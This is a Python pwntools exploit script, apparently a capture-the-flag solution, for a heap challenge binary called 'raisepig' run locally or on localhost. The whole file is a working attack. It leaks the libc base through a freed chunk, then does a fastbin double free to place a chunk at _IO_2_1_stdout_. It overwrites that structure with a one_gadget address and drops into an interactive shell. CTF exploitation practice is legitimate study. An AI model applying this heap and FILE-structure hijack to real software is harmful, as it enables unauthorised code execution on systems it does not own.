#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./raisepig")

else:
    io = remote("localhost", 9999)

elf = ELF("./raisepig")
libc = ELF("./libc-64")
main_arena = 0x3c4b20
oneGadgetOffset = 0xf0274
oneGadgetOffset = 0xf1117

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)

def Raise(length, name, tp, finish = True):
    io.sendlineafter(" : ", "1")
    io.sendlineafter(" :", str(length))
    io.sendafter(" :", name)
    if finish:
        io.sendlineafter(" :", tp)

def visit():
    io.sendlineafter(" : ", "2")

def eat(idx):
    io.sendlineafter(" : ", "3")
    io.sendlineafter(":", str(idx))

if __name__ == "__main__":
    Raise(160, '0000', '0000')
    Raise(160, '1111', '1111')
    eat(0)
    Raise(16, '22222222', '22222222')
    visit()
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - 88 - main_arena
    success("libc.address -> {:#x}".format(libc.address))
    oneGadget = oneGadgetOffset + libc.address
    pause()

    success("hijack IO_file Structure")
    #  DEBUG()
    Raise(0x60, '3333', '3333')
    Raise(0x60, '4444', '4444')
    eat(3)
    eat(4)
    eat(3)

    Raise(0x60, p64(libc.sym['_IO_2_1_stdout_'] + 0x9d), '5555')
    Raise(0x60, '6666', '6666')
    Raise(0x60, '7777', '7777')

    payload = p8(0) * 3 + 2 * p64(0) + p64(0xffffffff) + p64(0) + p64(oneGadget) + p64(libc.sym['_IO_2_1_stdout_'] + 0x98)
    Raise(0x60, payload, '8888', False)

    io.interactive()
    io.close()

